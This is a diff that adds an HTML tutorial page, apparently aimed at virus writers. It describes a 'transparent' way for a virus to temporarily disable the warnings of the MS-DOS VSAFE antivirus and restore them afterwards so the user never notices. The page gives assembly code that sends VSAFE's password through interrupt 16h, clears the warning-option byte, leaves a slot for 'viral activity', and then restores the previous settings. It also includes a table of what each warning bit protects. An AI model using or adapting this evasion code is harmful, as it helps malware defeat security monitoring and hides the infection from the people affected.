@@ -1,0 +1,77 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Deactivating/reactivating VSAFE</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+2>A new, completely transparent
+method<BR>
+of deactivating/reactivating VSAFE</FONT></FONT></B><BR>
+</P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<UL>
+<PRE>
+After just a few minutes of analysis several months ago, I discovered a
+way to bypass VSAFE which is far less detectable than the usual de-
+installation. The total removal of VSAFE by a virus would arouse suspicion
+and would be incredibly obvious if some other TSR had been installed after
+VSAFE, since VSAFE displays an alert box in such a case warning that VSAFE
+cannot be removed.
+
+The new method involves changing, temporarily, the control byte used by
+VSAFE to determine the warning options selected by the user.  Not only is
+this warning option control byte trivial to reset, but VSAFE actually
+RETURNS THE PREVIOUS WARNING OPTION BYTE to the calling routine, allowing
+the warning options to be reset to their original values after a virus has
+done its dirty deed!  This temporary deactivation of VSAFE would be
+totally undetectable by the computer user.  A virus could simply deactivate
+all or a selected number of VSAFE's warning options, do anything that it
+wants, then restore VSAFE to its original state.
+
+The simple routine listed below has been tested on the MS-DOS 6.0 version
+of VSAFE only.  However, it is likely that it will work on all other
+versions of VSAFE, also.
+
+Here's the code:
+
+mov     ax,0fa02                ;reset VSAFE (fa) warning options (02)
+push    ax                      ;store value for future use
+mov     bl,0                    ;warning options = none (see below)
+mov     dx,05945                ;password
+push    dx                      ;store value for future use
+int     016                     ;do it
+push    cx                      ;store previous settings returned by VSAFE
+;--------------
+;viral activity
+;--------------
+pop     cx
+pop     dx
+pop     ax
+mov     bl,cl                   ;move previous warning option settings back
+int     016                     ;restore previous warning settings
+
+The warning control byte (sent in bl, returned in cl) is set up as follows:
+
+Bit                                  Value
+---                                  -----
+ 0  -  HD low level format             1  =  select option
+ 1  -  Residence attempt               0  =  deselect option
+ 2  -  General write protect
+ 3  -  Check executable files
+ 4  -  Boot sector virus
+ 5  -  Protect HD boot sector
+ 6  -  Protect FD boot sector
+ 7  -  Protect executable files</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
